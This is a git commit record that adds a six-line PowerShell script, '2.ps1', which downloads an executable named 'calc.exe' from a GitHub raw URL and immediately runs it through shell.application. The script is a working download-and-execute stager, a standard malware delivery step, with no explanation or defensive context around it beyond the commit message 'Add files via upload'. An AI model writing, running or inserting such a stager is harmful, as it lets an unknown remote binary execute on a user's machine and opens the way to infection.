8369856dc1e8ae1cfabad1a57bf9ff0ee3ed79f7
jjjj77 <48022154+jjjj77@users.noreply.github.com>
2019-02-28 23:28:22 +0300

    Add files via upload

---
+++ 2.ps1
@@ -0,0 +1,6 @@
+﻿$down = New-Object System.Net.WebClient
+$url  = 'https://github.com/jjjj77/1/blob/master/calc.exe?raw=true';
+$file = 'calc.exe';
+$down.DownloadFile($url,$file);
+$exec = New-Object -com shell.application
+$exec.shellexecute($file);
